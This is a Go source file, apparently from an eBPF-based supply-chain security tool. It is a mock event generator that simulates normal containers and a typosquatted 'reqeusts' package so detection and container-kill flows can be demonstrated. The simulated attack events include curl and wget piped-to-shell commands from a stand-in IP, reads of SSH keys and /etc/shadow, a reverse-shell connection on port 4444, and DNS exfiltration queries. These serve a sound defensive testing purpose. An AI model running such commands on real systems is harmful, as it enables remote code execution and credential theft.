package ingestion

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"math/big"
	"strings"
	"sync"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/enforcer"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
)

// Mock: 커널 없이 대시보드·규칙·격리 흐름을 개발하기 위한 가짜 이벤트 소스.
// 정상 컨테이너 2개와 타이포스쿼팅 패키지를 흉내 낸 컨테이너 1개가 돈다.
// Enforcer도 구현해서, kill하면 해당 컨테이너가 멈췄다가 새 ID로 재기동한다.
// 컨테이너 시작 · 종료(KindStart · KindExit)도 보내므로 차단 이미지 격리 · 런타임 건 흐름을 시연할 수 있다.
// 설치 세션이 보고되면(SimulateInstall) 그 컨테이너 이름으로 설치를 흉내 낸다 — CLI · docker 없이 설치 검사 흐름 시연용.
type Mock struct {
	mu         sync.Mutex
	out        chan<- model.Event
	containers []*mockContainer
	installs   []*mockContainer // SimulateInstall 이 띄운 일회용 컨테이너
	Interval   time.Duration    // 정상 이벤트 간격 (기본 100ms)
	AttackIn   time.Duration    // 공격 시나리오 반복 간격 (기본 20s)
	RestartIn  time.Duration    // kill 후 재기동까지 (기본 15s)
	// Step: 설치 흉내 이벤트 간격 (기본 InstallStep). 인스턴스 값이라 테스트가 패키지 변수를 바꾸지 않아도 된다
	Step time.Duration
}

type mockContainer struct {
	id, name, image string
	attacker        bool
	killedAt        time.Time
	normal          []model.Event
}

func NewMock() *Mock {
	return &Mock{
		Interval:  100 * time.Millisecond,
		AttackIn:  20 * time.Second,
		RestartIn: 15 * time.Second,
		Step:      InstallStep,
		containers: []*mockContainer{
			{name: "web-api", image: "node:22-alpine", normal: []model.Event{
				{Kind: model.KindExec, Comm: "node", Args: "node /app/server.js"},
				{Kind: model.KindOpen, Comm: "node", Path: "/app/node_modules/express/index.js"},
				{Kind: model.KindOpen, Comm: "node", Path: "/etc/hosts"},
				{Kind: model.KindConnect, Comm: "node", DstIP: "172.18.0.4", DstPort: 5432},
				{Kind: model.KindConnect, Comm: "node", DstIP: "104.16.2.35", DstPort: 443, DstHost: "api.github.com"},
			}},
			{name: "worker", image: "python:3.12-slim", normal: []model.Event{
				{Kind: model.KindExec, Comm: "python3", Args: "python3 -m worker"},
				{Kind: model.KindOpen, Comm: "python3", Path: "/usr/local/lib/python3.12/json/__init__.py"},
				{Kind: model.KindOpen, Comm: "python3", Path: "/tmp/job-queue.lock"},
				{Kind: model.KindConnect, Comm: "python3", DstIP: "172.18.0.5", DstPort: 6379},
			}},
			{name: "pkg-reqeusts", image: "demo/reqeusts:1.0.2", attacker: true, normal: []model.Event{
				{Kind: model.KindExec, Comm: "python3", Args: "python3 -c import reqeusts"},
				{Kind: model.KindOpen, Comm: "python3", Path: "/usr/local/lib/python3.12/site-packages/reqeusts/__init__.py"},
				{Kind: model.KindConnect, Comm: "python3", DstIP: "151.101.0.223", DstPort: 443, DstHost: "files.pythonhosted.org"},
			}},
		},
	}
}

// exfilName: DNS 유출 시연 이름 — 48자 hex 라벨(가짜 유출 데이터) 아래 예약 TLD(.example, RFC 2606)
var exfilName = strings.Repeat("deadbeef", 6) + ".exfil.example"

// dnsExfil: DNS 질의로 데이터를 실어 보내는 패턴(10/30) — 48자 라벨 A 질의 + TXT 질의. 컨테이너 네임서버(127.0.0.11:53)로 간다
var dnsExfil = []model.Event{
	{Kind: model.KindDNS, Comm: "python3", DstHost: exfilName, Qtype: "A", DstIP: "127.0.0.11", DstPort: 53},
	{Kind: model.KindDNS, Comm: "python3", DstHost: "data.exfil.example", Qtype: "TXT", DstIP: "127.0.0.11", DstPort: 53},
}

// attack: 데모 시나리오 1~3 (docs/00-개발-계획.md §7) + dns 질의 1건(10/30, 공격 체인의 「통신」 단계)
var attack = []model.Event{
	{Kind: model.KindExec, Comm: "sh", Args: "sh -c curl -s http://203.0.113.7/p.sh | sh"},
	{Kind: model.KindExec, Comm: "curl", Args: "curl -s http://203.0.113.7/p.sh"},
	{Kind: model.KindOpen, Comm: "python3", Path: "/root/.ssh/id_rsa"},
	{Kind: model.KindOpen, Comm: "python3", Path: "/etc/shadow"},
	{Kind: model.KindDNS, Comm: "python3", DstHost: exfilName, Qtype: "A", DstIP: "127.0.0.11", DstPort: 53},
	{Kind: model.KindConnect, Comm: "python3", DstIP: "203.0.113.7", DstPort: 8081, DstHost: "cdn.reqeusts-update.test"},
	{Kind: model.KindConnect, Comm: "sh", DstIP: "203.0.113.7", DstPort: 4444, DstHost: "cdn.reqeusts-update.test"},
}

func (m *Mock) Run(ctx context.Context, out chan<- model.Event) error {
	m.mu.Lock()
	m.out = out
	for _, c := range m.containers {
		c.id = newID()
		send(out, c.lifecycle(model.KindStart, time.Now()))
	}
	m.mu.Unlock()

	tick := time.NewTicker(m.Interval)
	defer tick.Stop()
	nextAttack := time.Now().Add(5 * time.Second)
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case now := <-tick.C:
			m.mu.Lock()
			for _, c := range m.containers {
				if !c.killedAt.IsZero() {
					if now.Sub(c.killedAt) < m.RestartIn {
						continue
					}
					c.killedAt, c.id = time.Time{}, newID() // 재배포된 것처럼 새 ID
					send(out, c.lifecycle(model.KindStart, now))
				}
				if rnd(3) == 0 {
					send(out, c.event(c.normal[rnd(len(c.normal))], now))
				}
			}
			if now.After(nextAttack) {
				for _, c := range m.containers {
					if c.attacker && c.killedAt.IsZero() {
						for _, a := range attack {
							send(out, c.event(a, now))
						}
					}
				}
				nextAttack = now.Add(m.AttackIn)
			}
			m.mu.Unlock()
		}
	}
}

// DNSTraced: mock 은 DNS 응답을 이벤트에 직접 넣으므로 항상 추적 중으로 본다
func (m *Mock) DNSTraced() bool { return true }

// Kill: enforcer.Enforcer 구현 — 해당 컨테이너의 이벤트 생성을 멈추고 종료 이벤트를 보낸다.
func (m *Mock) Kill(_ context.Context, containerID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	for _, c := range append(append([]*mockContainer{}, m.containers...), m.installs...) {
		if c.id == containerID {
			if !c.killedAt.IsZero() {
				return enforcer.ErrNotRunning
			}
			c.killedAt = time.Now()
			if m.out != nil {
				send(m.out, c.lifecycle(model.KindExit, c.killedAt))
			}
			return nil
		}
	}
	return enforcer.ErrNotFound
}

// SimulateInstall: 보고된 설치 세션의 컨테이너 이름으로 설치 이벤트를 흘린다(review.Options.OnInstallStart).
// 패키지 이름에 reqeusts 가 있으면 데모 공격(격리), dns-exfil 이면 DNS 유출 질의, tiny-git-dep 이면 git:// 9418 접속(경고), 그 밖은 정상 설치.
// 시연 세션(Demo)은 시연 서비스가 PlayDemo 로 직접 재생하므로 여기서는 건너뛴다.
func (m *Mock) SimulateInstall(s model.InstallSession) {
	if s.Demo {
		return
	}
	c, out := m.installContainer(s)
	if out == nil {
		return // 소스가 아직 돌지 않음
	}
	steps, burst := installScript(s.Manager, s.Packages)
	go m.playInstall(c, steps, burst, out)
}

// installContainer: 설치 세션의 일회용 컨테이너(m.containers 밖이라 kill 뒤 재기동하지 않는다). 소스가 돌지 않으면 out 이 nil
func (m *Mock) installContainer(s model.InstallSession) (*mockContainer, chan<- model.Event) {
	m.mu.Lock()
	defer m.mu.Unlock()
	image := s.Image
	if image == "" {
		image = map[string]string{"pip": "python:3.12-slim", "npm": "node:22-alpine", "cargo": "rust:1-slim"}[s.Manager]
	}
	c := &mockContainer{id: newID(), name: s.Container, image: image}
	if m.out != nil {
		m.installs = append(m.installs, c)
	}
	return c, m.out
}

// demoScenarios: 시연 시나리오별 이벤트(계약 §2 mock) — 실제 데모 패키지(setup.py)가 내는 순서와 같다
var demoScenarios = map[string][]model.Event{
	"shell": {
		{Kind: model.KindExec, Comm: "sh", Args: "sh -c wget -q -O- http://203.0.113.7/postinstall.sh | sh"},
		{Kind: model.KindOpen, Comm: "python3", Path: "/etc/shadow"},
	},
	"revshell":  {{Kind: model.KindConnect, Comm: "python3", DstIP: "203.0.113.7", DstPort: 4444}},
	"direct-ip": {{Kind: model.KindConnect, Comm: "python3", DstIP: "203.0.113.7", DstPort: 443}},
	"domain": {
		{Kind: model.KindDNS, Comm: "python3", DstHost: "example.com", Qtype: "A", DstIP: "127.0.0.11", DstPort: 53},
		{Kind: model.KindConnect, Comm: "python3", DstIP: "93.184.216.34", DstPort: 443, DstHost: "example.com"},
	},
	"dns-exfil": dnsExfil,
	"benign":    nil, // 정상 설치 대조군(11/04) — 세션 패키지(./sg-demo-benign)의 pip 정상 설치 이벤트만
}

// demoOrder: all 의 순서
var demoOrder = []string{"shell", "revshell", "direct-ip", "domain", "dns-exfil"}

// PlayDemo: 시연 세션(10/30)을 컨테이너 없이 재생한다 — 시작 → pip 설치 정상 이벤트(세션의 패키지) → 시나리오 이벤트를 한 건씩(실제처럼 첫 kill 에서 멈춘다) → 종료.
// 끝날 때까지 막히고, 격리(kill)로 끝났으면 true. 소스가 아직 돌지 않으면 바로 false
func (m *Mock) PlayDemo(ctx context.Context, s model.InstallSession, scenario string) bool {
	c, out := m.installContainer(s)
	if out == nil {
		return false
	}
	steps, _ := installScript("pip", s.Packages)
	names := []string{scenario}
	if scenario == "all" {
		names = demoOrder
	}
	groups := make([][]model.Event, 0, len(steps)+8)
	for _, ev := range steps {
		groups = append(groups, []model.Event{ev})
	}
	for _, n := range names {
		for _, ev := range demoScenarios[n] {
			groups = append(groups, []model.Event{ev})
		}
	}
	return m.play(ctx, c, groups, out)
}

// InstallStep: 설치 흉내 이벤트 간격
var InstallStep = 150 * time.Millisecond

// playInstall: 정상 설치 이벤트를 한 단계씩 보내고, 공격(burst)은 런타임 데모처럼 한 번에 보낸다 —
// 짧은 악성 스크립트의 커널 이벤트는 격리(kill)가 닿기 전에 몰려 들어오므로 건에 연쇄 전체가 남는다.
func (m *Mock) playInstall(c *mockContainer, steps, burst []model.Event, out chan<- model.Event) {
	groups := make([][]model.Event, 0, len(steps)+1)
	for _, ev := range steps {
		groups = append(groups, []model.Event{ev})
	}
	if len(burst) > 0 {
		groups = append(groups, burst)
	}
	m.play(context.Background(), c, groups, out)
}

// play: 시작 이벤트 → 묶음을 Step 간격으로 → 종료 이벤트. 도중에 Kill 되면(종료 이벤트는 Kill 이 보냈다) 멈추고 true.
// ctx 가 끝나면 남은 묶음을 버리고 종료 이벤트만 보낸다
func (m *Mock) play(ctx context.Context, c *mockContainer, groups [][]model.Event, out chan<- model.Event) (killed bool) {
	defer func() {
		m.mu.Lock()
		for i, x := range m.installs {
			if x == c {
				m.installs = append(m.installs[:i], m.installs[i+1:]...)
				break
			}
		}
		m.mu.Unlock()
	}()
	send(out, c.lifecycle(model.KindStart, time.Now()))
	for _, g := range groups {
		select {
		case <-ctx.Done():
			break
		case <-time.After(m.Step):
		}
		if ctx.Err() != nil {
			break
		}
		m.mu.Lock()
		killed = !c.killedAt.IsZero()
		if !killed {
			now := time.Now()
			for _, tmpl := range g {
				send(out, c.event(tmpl, now))
			}
		}
		m.mu.Unlock()
		if killed {
			return true // Kill 이 종료 이벤트를 이미 보냈다
		}
	}
	time.Sleep(m.Step)
	m.mu.Lock()
	defer m.mu.Unlock()
	if !c.killedAt.IsZero() {
		return true
	}
	c.killedAt = time.Now()
	send(out, c.lifecycle(model.KindExit, c.killedAt))
	return false
}

// installScript: 매니저별 정상 설치 이벤트(steps)와 패키지별 데모 공격(burst).
// reqeusts → 런타임 데모 공격(격리) · dns-exfil → DNS 유출 질의 묶음(10/30) · tiny-git-dep → git:// 9418 접속(경고)
func installScript(manager string, packages []string) (steps, burst []model.Event) {
	pkgs := strings.Join(packages, " ")
	var evs []model.Event
	switch manager {
	case "npm":
		evs = []model.Event{
			{Kind: model.KindExec, Comm: "npm", Args: "npm install --no-fund --no-audit " + pkgs},
			{Kind: model.KindConnect, Comm: "node", DstIP: "104.16.0.35", DstPort: 443, DstHost: "registry.npmjs.org"},
			{Kind: model.KindOpen, Comm: "node", Path: "/work/node_modules/.package-lock.json"},
		}
	case "cargo":
		evs = []model.Event{
			{Kind: model.KindExec, Comm: "cargo", Args: "cargo install " + pkgs},
			{Kind: model.KindConnect, Comm: "cargo", DstIP: "18.65.3.11", DstPort: 443, DstHost: "crates.io"},
			{Kind: model.KindConnect, Comm: "cargo", DstIP: "18.65.3.12", DstPort: 443, DstHost: "static.crates.io"},
			{Kind: model.KindExec, Comm: "rustc", Args: "rustc --edition=2021 --crate-type bin"},
		}
	default:
		evs = []model.Event{
			{Kind: model.KindExec, Comm: "pip", Args: "pip install --no-cache-dir " + pkgs},
			{Kind: model.KindConnect, Comm: "pip", DstIP: "151.101.0.223", DstPort: 443, DstHost: "pypi.org"},
			{Kind: model.KindConnect, Comm: "pip", DstIP: "151.101.64.223", DstPort: 443, DstHost: "files.pythonhosted.org"},
			{Kind: model.KindOpen, Comm: "python3", Path: "/usr/local/lib/python3.12/site-packages/setuptools/__init__.py"},
		}
	}
	low := strings.ToLower(pkgs)
	switch {
	case strings.Contains(low, "dns-exfil"):
		burst = dnsExfil
	case strings.Contains(low, "reqeusts"):
		burst = attack
	case strings.Contains(low, "tiny-git-dep"):
		evs = append(evs,
			model.Event{Kind: model.KindConnect, Comm: "git", DstIP: "140.82.112.3", DstPort: 9418, DstHost: "github.com"},
			model.Event{Kind: model.KindExec, Comm: "git", Args: "git clone git://github.com/example/tiny-git-dep.git"})
	}
	return evs, burst
}

func (c *mockContainer) lifecycle(k model.Kind, now time.Time) model.Event {
	return model.Event{Kind: k, Timestamp: now.UTC(), ContainerID: c.id, ContainerName: c.name, ImageName: c.image}
}

var _ enforcer.Enforcer = (*Mock)(nil)

func (c *mockContainer) event(tmpl model.Event, now time.Time) model.Event {
	ev := tmpl
	ev.Timestamp = now.UTC()
	ev.ContainerID, ev.ContainerName, ev.ImageName = c.id, c.name, c.image
	ev.Pid = uint32(1000 + rnd(30000))
	if ev.Kind == model.KindConnect {
		ev.DNSTraced = true // mock 은 trace_dns 가 늘 있는 셈 (DstHost 가 비면 직접 IP 연결)
	}
	return ev
}

func newID() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		panic(errors.Join(errors.New("crypto/rand"), err))
	}
	return hex.EncodeToString(b)
}

func rnd(n int) int {
	v, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
	if err != nil {
		return 0
	}
	return int(v.Int64())
}
